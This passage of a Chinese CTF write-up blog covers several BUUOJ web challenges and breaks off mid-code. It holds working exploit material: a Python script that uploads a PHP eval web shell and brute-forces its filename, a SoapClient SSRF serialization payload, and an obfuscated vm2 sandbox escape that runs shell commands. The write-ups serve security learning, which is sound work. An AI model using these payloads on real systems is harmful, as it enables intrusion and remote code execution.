class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了师傅们的wp，跟着做的，学习一下</p><p><strong>1：Think PHP上传默认路径</strong></p><p>默认上传路径是/home/index/upload</p><p><strong>2：Think PHP upload()多文件上传</strong> think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测，至于为什么上传两次1.txt,是为了获取php文件的后缀，因为这里的后缀命名方式运用了<strong>uniqid函数</strong>它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。 </p><p><strong>3</strong>.<strong>ThinkPHP 上传文件名爆破</strong></p><p>先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 pyrhon2</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">"http://1b021a4c-b72d-4066-a7c8-d04b3a25da01.node3.buuoj.cn/"</span></span><br><span class="line">path = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>:(<span class="string">"a.txt"</span>,<span class="string">'a'</span>), <span class="string">"file1"</span>:(<span class="string">"b.php"</span>, <span class="string">'&lt;?php eval($_GET["a"]);'</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line">param=json.loads(r.content)</span><br><span class="line"><span class="keyword">print</span> param</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = url + <span class="string">"/Public/Uploads/"</span>+param[<span class="string">'url'</span>].split(<span class="string">"/"</span>)[<span class="number">-2</span>]+<span class="string">"/%s.php"</span> % hex(j)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">429</span>:<span class="comment">#规避过于频繁访问导致的429</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> path</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> j, path, r.status_code</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="LCTF-bestphp’s-revenge（新知识）"><a href="#LCTF-bestphp’s-revenge（新知识）" class="headerlink" title="[LCTF]bestphp’s revenge（新知识）"></a>[LCTF]bestphp’s revenge（新知识）</h3><p>开题，给了源码，审计</p><p>知识点：</p><p>1、SoapClient反序列化导致SSRF</p><p>2、serialize_handler处理session的方式不同导致session注入</p><p>3、crlf漏洞</p><p>SoapClient简介：</p><p>SOAP作为webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP 可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。（<a href="https://www.anquanke.com/post/id/153065#h2-1）这篇文章讲的很详细" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1）这篇文章讲的很详细</a></p><p>crlf可以看这篇文章（<a href="https://www.jianshu.com/p/d4c304dbd0af）" target="_blank" rel="noopener">https://www.jianshu.com/p/d4c304dbd0af）</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">array</span>(<span class="number">0</span>) &#123; &#125;</span><br></pre></td></tr></table></figure><p>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。</p><p>发现flag.php页面可以访问，给了提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>具体的知识点讲解可以看看别的师傅的，不知道该如何表述，就直接就开始做题吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"htpp://127.0.0.1/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;$url,<span class="string">'location'</span>=&gt;$url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>,<span class="string">""</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"|"</span>.urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在本地环境生成序列化数据，打上去</p><img src="/2020/05/29/buuoj4/10.png" class="" title="examplename"><img src="/2020/05/29/buuoj4/11.png" class="" title="examplename"><img src="/2020/05/29/buuoj4/12.png" class="" title="examplename"><h3 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>对json数据进行解码，再经过is_valid过滤，file_get_contents包含文件内容之后又经过了一次过滤，这里可以用unicode编码进行绕过，用php伪协议读取数据</p><img src="/2020/05/29/buuoj4/13.png" class="" title="examplename"><p>数据base64解码就是flag</p><h3 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h3><p>看到题目第一眼，就想到应该是逃逸题，开题看看吧</p><img src="/2020/05/29/buuoj4/14.png" class="" title="examplename"><p>看这个提示，不确定是不是php，访问一下run online</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"code"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'code'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给的是用php写的码，eval函数在php和node.js中都有，那就看看nodejs报错信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">    at vm.js:1:1</span><br><span class="line">    at Script.runInContext (vm.js:131:20)</span><br><span class="line">    at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62)</span><br><span class="line">    at &#x2F;app&#x2F;server.js:51:33</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p>下面看wp来做了，说是vm2沙箱逃逸</p><p>这题waf了一些东西，搜来的poc不能直接打</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</span><br></pre></td></tr></table></figure><p>直接找了个能用的payload，nodejs也是第一次做，没接触过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h3 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码，flag写在了config.php文件中，但是没有办法直接读取，对config.php进行了正则过滤，basename()函数返回路径中的文件名部分，所以这里需要构造空字节来绕过正则匹配，%00没有用，查了一下还有一个%ff，成功</p><img src="/2020/05/29/buuoj4/15.png" class="" title="examplename"><h3 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h3><p>flag要有五个钻石才能买，一分一钻石，只有三分，要想办法搞到五个积分</p><p>先来看看源码吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'*********************'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span 